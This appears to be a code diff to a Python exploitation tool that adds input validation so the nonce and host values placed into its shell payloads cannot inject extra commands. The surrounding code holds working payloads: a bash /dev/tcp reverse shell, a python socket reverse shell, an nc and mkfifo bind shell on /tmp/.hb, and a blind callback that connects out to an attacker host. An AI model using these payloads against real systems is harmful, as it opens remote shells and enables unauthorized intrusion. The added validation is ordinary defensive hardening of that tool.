@@ -64,6 +64,18 @@ def local_ip_for(target: str, _sock_factory=socket.socket) -> str:
 _UID_RE = re.compile(r"uid=(\d+)\(")
 
 
+_SAFE_TOKEN_RE = re.compile(r"\A[0-9A-Za-z._-]+\Z")
+
+
+def _require_safe(name: str, value: str) -> str:
+    """Reject any token that could break out of the shell command it is embedded in.
+    nonce/lhost are interpolated into sh -c payloads unquoted; a metacharacter here
+    would be command injection on the target, so fail closed."""
+    if not _SAFE_TOKEN_RE.match(str(value)):
+        raise ValueError(f"unsafe {name} for payload: {value!r}")
+    return str(value)
+
+
 def _drain(sock: socket.socket, timeout: float) -> bytes:
     sock.settimeout(timeout)
     chunks = []
@@ -121,6 +133,9 @@ def _first_available(*variants: str) -> str:
 
 def reverse_payload(lhost: str, lport: int, nonce: str) -> str:
     """Announce the nonce, then hand /bin/sh back over the reverse connection."""
+    _require_safe("lhost", lhost)
+    _require_safe("nonce", nonce)
+    lport = int(lport)
     bash = (f"bash -c 'exec 3<>/dev/tcp/{lhost}/{lport}; echo {nonce}-MARK >&3; "
             f"sh -i >&3 2>&3 <&3'")
     py = (f"python3 -c 'import socket,subprocess,os;"
@@ -139,6 +154,8 @@ def reverse_payload(lhost: str, lport: int, nonce: str) -> str:
 
 def bind_payload(bind_port: int, nonce: str) -> str:
     """Spawn /bin/sh bound to bind_port; connect+confirm_shell proves it (nonce sent on probe)."""
+    _require_safe("nonce", nonce)
+    bind_port = int(bind_port)
     fifo = "/tmp/.hb"
     return (f"rm -f {fifo}; mkfifo {fifo}; "
             f"cat {fifo} | /bin/sh -i 2>&1 | nc -l -p {bind_port} > {fifo} &")
@@ -146,6 +163,9 @@ def bind_payload(bind_port: int, nonce: str) -> str:
 
 def blind_callback_payload(lhost: str, lport: int, nonce: str) -> str:
     """Connect back and send ONLY the nonce — proves code ran without a shell channel."""
+    _require_safe("lhost", lhost)
+    _require_safe("nonce", nonce)
+    lport = int(lport)
     bash = f"bash -c 'exec 3<>/dev/tcp/{lhost}/{lport}; echo {nonce}-MARK >&3'"
     py = (f"python3 -c 'import socket;s=socket.socket();"
           f"s.connect((\"{lhost}\",{lport}));s.sendall(b\"{nonce}-MARK\")'")
